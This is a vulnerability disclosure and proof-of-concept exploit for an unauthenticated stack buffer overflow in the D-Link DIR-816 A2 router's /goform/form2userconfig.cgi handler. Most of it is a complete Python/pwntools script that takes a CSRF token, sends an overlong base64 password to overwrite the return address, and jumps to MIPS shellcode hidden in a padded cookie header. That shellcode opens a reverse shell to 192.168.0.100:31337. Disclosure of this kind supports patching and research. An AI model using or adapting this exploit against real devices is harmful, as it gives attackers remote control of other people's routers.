# D-Link DIR-816 A2 Stack Overflow
##### Vender & Firmware version ：D-Link 1.10 B05 
##### Exploit Author: ScareCrowL 
##### Vendor Homepage: http://www.dlink.com.cn/
##### Hardware Link: http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816 
# Vulnerability Description
Stack-based buffer overflows found on d-link dir-816 A2 1.10 B05 devices allow arbitrary remote code execution without authentication.Embodied in the /goform/form2userconfig.cgi handler function, long password may lead to stack-based buffer overflow and cover the return address.
# Vulnerability Detail

In the route /goform/form2userconfig.cgi handler.The value of the parameter password is base64 decoded, and the result is stored on the stack.
The vendor only sets a password length limit on the front end, but does not check the password length for POST submission.

![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/IDA.jpg)

There's no check on length of the password, and a very long input could lead to stack overflow and overwrite the return address:

![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/GDB.jpg)

Fortunately, the heap is at fixed address with permission rwx. So we could build a very large HTTP header which contains the shellcode, and set the return address to that shellcode.

After running the poc, we easily get the shell.

![image](https://github.com/RootSoull/Vuln-Poc/blob/master/D-Link/DIR-816/GETSHELL.png)

# POC
```python
#!/usr/bin/env python
# POC code reference: https://github.com/PAGalaxyLab/VulInfo/tree/master/D-Link/DIR-816/stack_overflow_1

from pwn import *
import requests

# First, we need the CSRF token
r=requests.get('http://192.168.0.1/dir_login.asp')
for l in r.content.split('\n'):
    if 'tokenid' in l:
        q2 = l.rfind('"')
        q1 = l[:q2].rfind('"')
        tokenid = l[q1+1:q2]
print 'tokenid is %s' % tokenid

# The return address will be overwritten as newRet (sample:0x0048fba8)
newRet = '\xa8\xfb\x48\x00'

# Reverse shell to 192.168.0.100:31337
shellcode = "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
shellcode += "\xf8\xff\xa5\xaf\x00\x64\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"

pMy= "L"*156+ newRet

rn = "\r\n"
padding = "\x00\x00\x00\x00"

pBuf= "username=A&oldpass=&newpass="+b64e(pMy)+"&confpass="+'&modify=B&select=s0&hiddenpass=&submit.htm=Send&tokenid=%s'% tokenid

payload = "POST /goform/form2userconfig.cgi " + "HTTP/1.1" + rn
payload += "Host: 192.168.0.1"+rn
payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
payload += "Accept-Language: en-US,en;q=0.5" + rn
payload += "Accept-Encoding: gzip, deflate" + rn
payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x100 + shellcode + padding*0x4000 + rn
payload += "Connection: close" + rn
payload += "Upgrade-Insecure-Requests: 1" + rn
payload += ("Content-Length: %d" % len(pBuf)) +rn
payload += 'Content-Type: application/x-www-form-urlencoded'+rn
payload += rn
payload += pBuf

p = remote('192.168.0.1', 80)
p.send(payload)
print p.recv()
```
